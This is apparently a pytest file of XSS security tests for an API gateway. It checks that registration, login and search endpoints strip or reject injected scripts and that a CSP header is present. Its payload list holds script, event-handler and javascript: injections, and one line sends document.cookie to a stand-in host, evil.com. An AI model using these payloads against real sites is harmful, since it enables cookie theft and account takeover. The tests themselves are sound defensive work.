"""XSS (Cross-Site Scripting) security tests.

Verifies that all user-supplied input is sanitized before storage/response.
The gateway uses Pydantic field validators with sanitize_html() on all
text fields to strip dangerous HTML tags and event handlers.
"""
import uuid
from datetime import datetime, timezone
from unittest.mock import AsyncMock

import pytest

from shared.utils.database import get_db
from src.main import app
from .conftest import client, raw_client, mock_db_no_user  # noqa: F401


XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<body onload=alert(1)>',
    '"><script>document.location="http://evil.com/"+document.cookie</script>',
    "javascript:alert(document.cookie)",
    '<embed src="data:text/html,<script>alert(1)</script>">',
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<a href="javascript:alert(1)">click</a>',
    '<div style="background-image:url(javascript:alert(1))">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
]


class TestXSSInRegistration:
    """XSS payloads in registration fields should be sanitized."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("payload", XSS_PAYLOADS[:6])
    async def test_xss_in_full_name(self, raw_client, payload):
        mock_session = mock_db_no_user()

        async def mock_refresh(obj):
            obj.id = uuid.uuid4()
            obj.created_at = datetime.now(timezone.utc)
            obj.updated_at = datetime.now(timezone.utc)
            obj.is_active = True

        mock_session.refresh = mock_refresh

        async def override_db():
            yield mock_session

        app.dependency_overrides[get_db] = override_db
        try:
            response = await raw_client.post("/api/v1/auth/register", json={
                "email": f"xss-{uuid.uuid4().hex[:8]}@test.com",
                "password": "SecurePass1",
                "full_name": f"{payload} Safe Name",
            })
            if response.status_code == 201:
                data = response.json()
                assert "<script>" not in data.get("full_name", "")
                assert "onerror=" not in data.get("full_name", "")
                assert "onload=" not in data.get("full_name", "")
                assert "javascript:" not in data.get("full_name", "")
                assert "<iframe" not in data.get("full_name", "")
            else:
                # 422 validation error is also acceptable
                assert response.status_code in (422, 400)
        finally:
            app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_xss_in_email_field(self, raw_client):
        """XSS in email should be rejected by email validation."""
        mock_session = mock_db_no_user()

        async def override_db():
            yield mock_session

        app.dependency_overrides[get_db] = override_db
        try:
            response = await raw_client.post("/api/v1/auth/login", json={
                "email": '<script>alert(1)</script>@test.com',
                "password": "TestPass1",
            })
            # Should fail validation or auth, never execute script
            assert response.status_code in (401, 422)
            assert "<script>" not in response.text
        finally:
            app.dependency_overrides.clear()


class TestXSSInSearch:
    """XSS payloads in search queries should not be reflected unsanitized."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("payload", XSS_PAYLOADS[:4])
    async def test_xss_in_search_query(self, client, payload):
        from conftest import auth_headers

        response = await client.post(
            "/api/v1/search",
            json={"query": payload, "search_type": "keyword", "page": 1, "page_size": 20},
            headers=auth_headers(),
        )
        # Even if search service is down (502), the response should not contain raw XSS
        if response.status_code == 200:
            assert "<script>" not in response.text
            assert "onerror=" not in response.text

    @pytest.mark.asyncio
    async def test_xss_in_search_suggest(self, client):
        from conftest import auth_headers  # noqa: F811

        response = await client.get(
            "/api/v1/search/suggest",
            params={"q": '<script>alert("xss")</script>'},
            headers=auth_headers(),
        )
        if response.status_code == 200:
            assert "<script>" not in response.text


class TestXSSInSecurityHeaders:
    """Verify Content-Security-Policy blocks inline scripts."""

    @pytest.mark.asyncio
    async def test_csp_header_present(self, client):
        resp = await client.get("/health")
        csp = resp.headers.get("Content-Security-Policy", "")
        assert "default-src" in csp
        # CSP should restrict script sources
        assert "'self'" in csp
